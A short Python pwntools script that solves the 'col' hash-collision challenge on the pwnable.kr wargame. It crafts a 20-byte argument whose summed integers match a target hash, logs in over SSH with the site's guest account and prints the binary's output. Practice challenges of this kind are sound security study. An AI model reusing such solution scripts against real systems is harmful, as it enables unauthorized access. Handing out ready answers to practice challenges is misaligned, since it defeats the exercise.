#!/usr/bin/env python3 
import pwn
import logging
hashcode = [0x21, 0xdd, 0x09, 0xec][::-1]

ans = bytes()
ans += bytes([1]*16)
for i in range(4):
	ans += bytes([hashcode[i]-4])


#pwn.context.log_level = logging.ERROR
s = pwn.ssh("col", "pwnable.kr", 2222, "guest")
#sh = s.shell()
p = s.process(["./col", ans])
print(p.recvall().decode("utf-8"))


